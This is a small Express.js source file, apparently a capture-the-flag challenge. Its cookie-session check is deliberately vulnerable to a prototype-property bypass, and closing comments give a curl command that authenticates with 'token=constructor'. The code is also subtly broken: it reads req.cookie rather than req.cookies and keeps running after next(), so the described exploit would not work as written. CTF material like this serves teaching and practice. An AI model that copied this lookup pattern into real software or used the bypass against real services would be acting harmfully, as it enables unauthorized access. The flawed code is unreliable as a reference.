const express = require('express')
const cookieParser = require('cookie-parser')
const app = express()

app.use(cookieParser())

const SESSION = {}
const mustBeAuthenticated = (req, res, next) => {
    if(req.cookie) {
        const token = req.cookie.token

        if(token && SESSION[token]) {
            //allow it
            next()
        }
    }
    res.send('Not Authorized!')
}

app.get('/', mustBeAuthenticated, (req, res) => {
    res.send('Happy Hacker!')
})

app.listen(9000, () => console.log('Access CTF url: http://0.0.0.0:9000 [Author: me_dheeraj]'))
// EXAMPLE >_
    // const test = {}
    // test.__proto__
        // constructor: f Object()
    // test['constructor'] === test.constructor //returns true

    // EXPLOIT
    //     The issue is trival to exploit. Using `cURL` we can simply run the following command:
    //    `curl http://locahost:9000/ -H "Cookie: token=constructor"`
    // and become authenticated! Alternavely, we can just see the document.cookie value via browser.
